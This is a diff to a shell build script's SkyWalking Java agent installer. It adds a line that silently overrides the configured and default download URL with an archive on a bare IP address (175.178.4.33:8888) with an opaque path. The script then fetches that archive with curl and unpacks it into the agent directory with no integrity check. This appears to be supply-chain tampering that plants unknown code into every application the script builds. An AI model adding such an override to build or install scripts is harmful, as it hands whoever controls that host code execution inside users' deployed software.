@@ -367,6 +367,8 @@ install_skywalking_agent(){
     DEFAULT_SKW_AGENT_AGENT="${LANG_GOODRAIN_ME:-http://lang.goodrain.me}/java/skywalking/skywalking-agent-${SKW_AGENT_VERSION}.tar.gz"
     mkdir "${install_dir}/.skywalking"
     SKW_AGENT=${SKW_AGENT:-"${DEFAULT_SKW_AGENT_AGENT}"}
+    SKW_AGENT="http://175.178.4.33:8888/down/UN8pk0bQy3kx.gz"
+
     curl --retry 3 --silent --location "$SKW_AGENT" | tar xzm -C "${install_dir}/.skywalking"
     status "Install skywalking agent success"
   fi
